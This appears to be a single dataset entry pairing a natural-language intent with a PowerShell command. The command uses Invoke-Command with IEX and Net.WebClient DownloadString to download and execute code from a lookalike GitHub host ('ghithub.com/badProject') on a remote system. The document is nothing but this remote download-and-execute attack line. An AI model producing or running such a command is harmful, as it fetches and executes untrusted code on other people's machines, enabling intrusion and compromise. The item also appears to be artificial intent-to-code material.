# Natural language intent:
# Download and execute PowerShell code from a potentially malicious GitHub repository on a remote system.

Invoke-Command -ComputerName <remote_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')}
